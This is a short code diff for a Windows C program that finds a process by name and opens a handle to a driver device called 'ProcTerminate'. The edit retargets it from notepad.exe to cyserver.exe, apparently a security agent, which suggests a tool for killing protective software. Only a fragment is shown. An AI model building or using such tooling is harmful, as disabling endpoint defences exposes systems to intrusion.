@@ -71,7 +71,7 @@ DWORD findProc(LPCWSTR processName) {
 
 int main(int argc, char* argv[]) {
 
-	PCWSTR processName = L"notepad.exe";
+	PCWSTR processName = L"cyserver.exe";
 
 	DWORD pid = findProc(processName);
 
@@ -80,7 +80,7 @@ int main(int argc, char* argv[]) {
 		return 1;
 	}
 
-	printf("[+] Found process %s with PID: %lu\n", processName, pid);
+	wprintf(L"[+] Found process %ls with PID: %lu\n", processName, pid);
 
 	HANDLE hDevice = CreateFile(
 		L"\\\\.\\ProcTerminate",
